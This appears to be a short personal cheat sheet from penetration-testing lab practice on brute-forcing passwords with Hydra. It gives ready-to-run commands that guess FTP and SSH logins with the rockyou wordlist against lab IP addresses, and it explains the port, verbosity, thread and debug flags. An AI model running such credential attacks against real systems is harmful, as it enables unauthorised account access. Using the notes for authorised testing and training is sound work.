# Passwords




# Hydra

`hydra -l username -P wordlist.txt server service `
ex: `hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.212.173 ftp`
ex: `hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV ftp://10.10.10.6`
`hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.216.161 ssh`


There are some extra optional arguments that you can add:

`-s` PORT to specify a non-default port for the service in question.
`-V` or -vV, for verbose, makes Hydra show the username and password combinations that are being tried. This verbosity is very convenient to see the progress, especially if you are still not confident of your command-line syntax.
`-t` n where n is the number of parallel connections to the target. -t 16 will create 16 threads used to connect to the target.
`-d`, for debugging, to get more detailed information about what’s going on. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this right away.